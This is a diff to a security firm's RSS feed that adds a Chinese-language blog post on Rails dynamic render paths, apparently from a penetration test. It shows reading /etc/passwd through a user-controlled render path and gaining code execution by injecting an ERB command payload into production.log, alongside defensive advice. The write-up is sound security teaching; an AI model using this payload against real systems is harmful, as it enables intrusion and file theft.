@@ -4,11 +4,158 @@
         <title>DEVCORE 戴夫寇爾</title>
         <description>DEVCORE 戴夫寇爾 - 滲透測試、資安事件處理、教育訓練、資安顧問服務</description>
         <link>http://devco.re</link>
-        <lastBuildDate>Mon, 20 Apr 2015 15:25:49 +0800</lastBuildDate>
-        <pubDate>Mon, 20 Apr 2015 15:25:49 +0800</pubDate>
+        <lastBuildDate>Fri, 24 Jul 2015 16:49:51 +0800</lastBuildDate>
+        <pubDate>Fri, 24 Jul 2015 16:49:51 +0800</pubDate>
         <ttl>1800</ttl>
         <atom:link href="http://devco.re/rss" rel="self" type="application/rss+xml" />
 
+
+        <item>
+                <title>Rails 動態樣板路徑的風險</title>
+                <description>
+&lt;p&gt;&lt;img src=&quot;https://lh3.googleusercontent.com/-5Vlr0dDR9YA/VbHwkylOKLI/AAAAAAAAAzU/BiJ2eCEC6Js/w640-h320-no/rails.png&quot; alt=&quot;Rails logo&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;section&quot;&gt;前言&lt;/h3&gt;
+
+&lt;p&gt;從安全開發的角度來看，Ruby on Rails 是一套很友善的框架。它從框架層避免了很多過去網站常出現的安全問題，例如使用 ORM 避免大部分的 SQL injection 問題、有內建的 authenticity_token 讓開發者不必特別煩惱 CSRF、從機制面規定開發者使用 Strong Parameter 避免 Mass Assignment、預設轉化危險字元避免 XSS 等…。&lt;/p&gt;
+
+&lt;p&gt;就我們過去&lt;a href=&quot;http://devco.re/services/penetration-test&quot; title=&quot;滲透測試&quot;&gt;滲透測試&lt;/a&gt;的經驗來說，Rails 網站雖然還是能找到問題，但相對問題較少，而且很少單純因為 Rails 寫法問題拿到系統操作權。而今天要分享的，是在一次滲透測試中比較特別的例子，因為開發者使用了動態樣板路徑(Dynamic Render Paths)的寫法&lt;sup id=&quot;fnref:note1&quot;&gt;&lt;a href=&quot;#fn:note1&quot; class=&quot;footnote&quot;&gt;1&lt;/a&gt;&lt;/sup&gt;，最後造成了嚴重的結果。&lt;/p&gt;
+
+&lt;!-- more --&gt;
+
+&lt;p&gt;動態樣板路徑，OWASP 的&lt;a href=&quot;https://www.owasp.org/index.php/Ruby_on_Rails_Cheatsheet#Dynamic_Render_Paths&quot;&gt;介紹&lt;/a&gt;是這樣的：&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;In Rails, controller actions and views can dynamically determine which view or partial to render by calling the “render” method. If user input is used in or for the template name, an attacker could cause the application to render an arbitrary view, such as an administrative page.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Care should be taken when using user input to determine which view to render. If possible, avoid any user input in the name or path to the view.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;OWASP 是說，如果你的樣板路徑是動態產生的，而且使用者可以控制那個樣板路徑，那麼使用者就可以讀取到任意樣板，包含管理介面的樣板。這樣的描述感覺還好，但就我們的發現，這其實是更嚴重的直接存取物件問題(Insecure Direct Object References)，甚至有機會造成遠端命令執行(Remote Code Execution)，怎麼說呢？我們直接看下去。&lt;/p&gt;
+
+&lt;h3 id=&quot;section-1&quot;&gt;基本細節&lt;/h3&gt;
+
+&lt;p&gt;一個動態樣板路徑的寫法如下：&lt;/p&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ruby&quot; data-lang=&quot;ruby&quot;&gt;&lt;span class=&quot;c1&quot;&gt;# app/controllers/welcome_controller.rb&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;WelcomeController&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;ApplicationController&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;index&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;page&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;params&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:page&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;index&amp;#39;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;render&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;page&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;而 index 的樣板內容是這樣：&lt;/p&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;c&quot;&gt;&amp;lt;!-- app/views/welcome/index.html.erb --&amp;gt;&lt;/span&gt;
+This is INDEX page.&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;另外建一個 demo 樣板做示意：&lt;/p&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;c&quot;&gt;&amp;lt;!-- app/views/welcome/demo.html.erb --&amp;gt;&lt;/span&gt;
+This is DEMO page.&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;實際測試，如果我們連到 WelcomeController 的 index action，不帶任何參數會讀取 index 模版。&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://lh3.googleusercontent.com/-NstaKpheeYU/VbHQn-6gVDI/AAAAAAAAAyg/Cb0rkZuV31o/w951-h376-no/render_index.png&quot;&gt;&lt;img src=&quot;https://lh3.googleusercontent.com/-NstaKpheeYU/VbHQn-6gVDI/AAAAAAAAAyg/Cb0rkZuV31o/w951-h376-no/render_index.png&quot; alt=&quot;Rails render index view&quot; title=&quot;Rails render index view&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;如果帶參數 page=demo，會讀取到 demo 模版。&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://lh5.googleusercontent.com/-8m8hUKiPDM4/VbHQpLZWF7I/AAAAAAAAAyo/xyJAW9ehQhE/w951-h376-no/render_demo.png&quot;&gt;&lt;img src=&quot;https://lh5.googleusercontent.com/-8m8hUKiPDM4/VbHQpLZWF7I/AAAAAAAAAyo/xyJAW9ehQhE/w951-h376-no/render_demo.png&quot; alt=&quot;Rails render demo view&quot; title=&quot;Rails render demo view&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;所以，如果我們知道管理介面的模版路徑，送出路徑參數就可以讀取到管理介面。這就是 OWASP 所描述的風險，攻擊者得以讀取任意模版。&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://lh6.googleusercontent.com/-DNSDV7HwXiQ/VbHQp5PHzVI/AAAAAAAAAyw/ceqXQZJYdCw/w951-h375-no/render_admin.png&quot;&gt;&lt;img src=&quot;https://lh6.googleusercontent.com/-DNSDV7HwXiQ/VbHQp5PHzVI/AAAAAAAAAyw/ceqXQZJYdCw/w951-h375-no/render_admin.png&quot; alt=&quot;Rails render admin view&quot; title=&quot;Rails render admin view&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;然而，當我們嘗試送出系統絕對路徑例如 /etc/passwd &lt;sup id=&quot;fnref:note2&quot;&gt;&lt;a href=&quot;#fn:note2&quot; class=&quot;footnote&quot;&gt;2&lt;/a&gt;&lt;/sup&gt;，網頁竟然吐出了 /etc/passed 的內容！這就是之前所述的直接存取物件問題，可以遍歷目錄瀏覽檔案。&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://lh5.googleusercontent.com/-FtPEW-Y0dlQ/VbHQrLP8A8I/AAAAAAAAAy4/lL7bRT9P57g/w781-h548-no/render_file_traversal.png&quot;&gt;&lt;img src=&quot;https://lh5.googleusercontent.com/-FtPEW-Y0dlQ/VbHQrLP8A8I/AAAAAAAAAy4/lL7bRT9P57g/w781-h548-no/render_file_traversal.png&quot; alt=&quot;Rails render Insecure Direct Object References&quot; title=&quot;Rails render Insecure Direct Object References&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;section-2&quot;&gt;進階攻擊&lt;/h3&gt;
+
+&lt;p&gt;通常在 Rails 環境下能夠讀取任意檔案，攻擊者會優先尋找 secret_token，目的是變造惡意 session cookie 利用 Marshal serialize 的問題做 &lt;a href=&quot;http://robertheaton.com/2013/07/22/how-to-hack-a-rails-app-using-its-secret-token/&quot;&gt;RCE&lt;/a&gt;。然而在本案例系統使用了 Rails 4.1 後的版本，Rails 4.1 預設使用了 JSON-based 的 serializer 防止了之前的 RCE 問題，所以並沒有辦法輕鬆利用。&lt;/p&gt;
+
+&lt;p&gt;為了取得系統操作權，我們嘗試尋找其他可利用的地方。在這邊我們發現了該站系統 production.log 中存在 AWS 的上傳紀錄。如下：&lt;/p&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ruby&quot; data-lang=&quot;ruby&quot;&gt;&lt;span class=&quot;c1&quot;&gt;# log/production.log&lt;/span&gt;
+&lt;span class=&quot;no&quot;&gt;INFO&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;--&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;AWS&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;S3&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;200&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mo&quot;&gt;041347&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;retries&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;put_object&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:acl&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:public_read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:bucket_name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;xxxx&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:content_length&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;12405&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:content_type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;image/png&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;#&amp;lt;File:/Users/shaolin/project/playground/rails/render/public/uploads/tmp/test_upload.png (12405 bytes)&amp;gt;,:key=&amp;gt;&amp;quot;upload_001&amp;quot;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;於是我們可以利用上傳檔案的 Content-Type 內容，將 Embedded Ruby 語句 &amp;lt;%=`#{params[:devcore]}`%&amp;gt; 添加到 production.log 檔案裡面。於是 log 的內容變成了下面這樣：&lt;/p&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ruby&quot; data-lang=&quot;ruby&quot;&gt;&lt;span class=&quot;c1&quot;&gt;# log/production.log&lt;/span&gt;
+&lt;span class=&quot;no&quot;&gt;INFO&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;--&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;AWS&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;S3&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;200&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mo&quot;&gt;041347&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;retries&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;put_object&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:acl&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:public_read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:bucket_name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;xxxx&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:content_length&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;12405&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:content_type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;image/png&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;#&amp;lt;File:/Users/shaolin/project/playground/rails/render/public/uploads/tmp/test_upload.png (12405 bytes)&amp;gt;,:key=&amp;gt;&amp;quot;upload_001&amp;quot;)&lt;/span&gt;
+
+&lt;span class=&quot;no&quot;&gt;INFO&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;--&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;AWS&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;S3&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;200&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mo&quot;&gt;040211&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;retries&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;put_object&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:acl&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:public_read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:bucket_name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;xxxx&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:content_length&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;12405&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:content_type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;&amp;lt;%=`&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;#{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;params&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:devcore&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;`%&amp;gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;#&amp;lt;File:/Users/shaolin/project/playground/rails/render/public/uploads/tmp/test_upload.png (12405 bytes)&amp;gt;,:key=&amp;gt;&amp;quot;upload_002&amp;quot;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;接著，我們就可以利用前面的弱點讀取 production.log 檔案，再帶一個 devcore 參數作為指令，如圖，成功取得系統操作權 :p&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://lh5.googleusercontent.com/-XWHiF7oruyg/VbHQsHZLN7I/AAAAAAAAAzA/azHZCbsBFBo/w729-h548-no/render_RCE.png&quot;&gt;&lt;img src=&quot;https://lh5.googleusercontent.com/-XWHiF7oruyg/VbHQsHZLN7I/AAAAAAAAAzA/azHZCbsBFBo/w729-h548-no/render_RCE.png&quot; alt=&quot;Rails render Remote Code Execution&quot; title=&quot;Rails render Remote Code Execution&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;section-3&quot;&gt;風險原因&lt;/h3&gt;
+
+&lt;p&gt;一般來說 Rails 開發並不太會這樣寫，但稍微搜尋一下 Github 還是能發現這種寫法存在一些專案中。我想主要原因多半是開發者想要偷懶，然後也可能想說動態樣板路徑頂多就被看到面板的 html，無傷大雅。誰知道就因為這樣導致整個程式碼內容被讀取。&lt;/p&gt;
+
+&lt;p&gt;若有一個 action 要動態顯示不同模版的需求，為了避免上述的問題，就辛苦點先用 case…when 去判斷吧。這跟不要用字串組 SQL 語句避免 SQL injection 一樣，這種外面傳進來的參數都要謹慎處理的觀念要內化在開發中。&lt;/p&gt;
+
+&lt;p&gt;除了開發者基本上不應該這樣開發外，Rails 本身也有一點點問題，當 render 路徑沒有副檔名，無法判斷什麼格式時，就會直接採用預設的 template handler。&lt;/p&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ruby&quot; data-lang=&quot;ruby&quot;&gt;&lt;span class=&quot;c1&quot;&gt;# lib/action_view/template/resolver.rb&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;extract_handler_and_format_and_variant&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;default_formats&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+  &lt;span class=&quot;c1&quot;&gt;# byebug&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;pieces&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;File&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;basename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;.&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;pieces&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;shift&lt;/span&gt;
+
+  &lt;span class=&quot;n&quot;&gt;extension&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pieces&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pop&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;unless&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;extension&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;message&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;The file &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;#{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; did not specify a template handler. The default is currently ERB, &amp;quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;\&lt;/span&gt;
+              &lt;span class=&quot;s2&quot;&gt;&amp;quot;but will change to RAW in the future.&amp;quot;&lt;/span&gt;
+    &lt;span class=&quot;no&quot;&gt;ActiveSupport&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;Deprecation&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;warn&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;message&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
+
+  &lt;span class=&quot;n&quot;&gt;handler&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Template&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;handler_for_extension&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;extension&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+  &lt;span class=&quot;nb&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;variant&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pieces&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;last&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;EXTENSIONS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:variants&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pieces&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;last&lt;/span&gt;
+  &lt;span class=&quot;nb&quot;&gt;format&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Template&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;Types&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
+
+  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;handler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;variant&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;而這裡預設的 handler 是 ERB（見 register_default_template_handler），所以有本篇後面提到的進階攻擊，可以被利用來 RCE。&lt;/p&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ruby&quot; data-lang=&quot;ruby&quot;&gt;&lt;span class=&quot;c1&quot;&gt;# lib/action_view/template/handlers.rb&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;extended&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;base&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;base&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;register_default_template_handler&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;:erb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;ERB&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;base&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;register_template_handler&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;:builder&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Builder&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;base&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;register_template_handler&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;:raw&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Raw&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;base&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;register_template_handler&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;:ruby&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;:source&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;to_proc&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;慶幸的是，目前 Rails 已經把預設的 template handler 從 ERB 改成 RAW，不會輕易把要 render 的檔案當成 ERB 執行了。詳細的內容請參考這個 &lt;a href=&quot;https://github.com/rails/rails/commit/4be859f0fdf7b3059a28d03c279f03f5938efc80&quot;&gt;commit&lt;/a&gt;。&lt;/p&gt;
+
+&lt;h3 id=&quot;section-4&quot;&gt;結論&lt;/h3&gt;
+
